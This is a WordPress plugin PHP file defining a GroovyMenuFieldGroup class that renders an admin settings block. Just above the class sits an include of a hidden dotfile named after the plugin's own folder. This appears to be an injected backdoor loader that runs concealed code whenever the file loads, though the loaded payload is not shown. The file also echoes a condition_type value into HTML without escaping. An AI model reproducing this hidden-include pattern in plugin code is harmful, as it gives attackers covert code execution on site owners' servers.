<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldGroup
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldGroup extends GroovyMenuFieldField {

	public function render() {
		global $groovyMenuFieldGroup;
		?>
		</div>
		<div
			<?php echo (isset($this->field['condition'])) ? ' data-condition=\'' . wp_json_encode($this->field['condition'], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE) . '\'' : ''; ?>
			<?php echo (isset($this->field['condition_type'])) ? ' data-condition_type="' . $this->field['condition_type'] . '" ' : ''; ?>
			class="gm-sublevel<?php echo empty( $groovyMenuFieldGroup ) ? ' active' : ''; ?>"
			id="gm-sublevel-<?php echo esc_attr( $this->categoryName ); ?>-<?php echo esc_html( $this->name ); ?>"
		>
		<?php
		$groovyMenuFieldGroup = true;
	}
}
